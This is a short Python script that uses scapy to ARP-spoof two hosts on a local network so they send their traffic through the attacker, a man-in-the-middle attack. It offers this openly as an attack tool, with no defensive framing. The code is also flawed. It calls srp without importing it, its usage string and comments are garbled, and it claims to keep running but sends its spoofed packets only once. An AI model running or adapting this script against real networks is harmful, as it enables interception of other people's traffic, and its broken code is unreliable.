from scapy.all import ARP, Ether, send, sniff
import time
import sys
import os

# Function to get MAC address of a given IP
def get_mac(ip):
    # Create an ARP request packet asking for the MAC address of the target IP
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    
    # Send the packet and capture the response
    answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    
    # Return the MAC address from the response
    print(answered_list[0][1].hwsrc)
    return answered_list[0][1].hwsrc

# ARP spoofing function
def spoof(target_ip, spoof_ip):
    # Get the target's MAC address
    target_mac = get_mac(target_ip)
    
    # Create the spoofed ARP packet
    arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    
    # Send the packet
    send(arp_response, verbose=False)

# ARP spoofer main function
def start_spoofing(target_ip, victim_ip):
    print("[*] Starting ARP spoofing... Press Ctrl+C to stop.")
    # Spoof the target (make it think we are th, victim)
    spoof(target_ip, victim_ip)

    # Optionally, spoof th, victim (make it think we are the target)
    spoof(victim_ip, target_ip)
    
    time.sleep(2)  # Wait 2 seconds before sending the next packet

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <target_ip>, victim_ip>")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    victim_ip = sys.argv[2]

    # Check if the script is running with root privileges
    if os.geteuid() != 0:
        print("[!] Please run as root.")
        sys.exit(1)

    start_spoofing(target_ip, victim_ip)
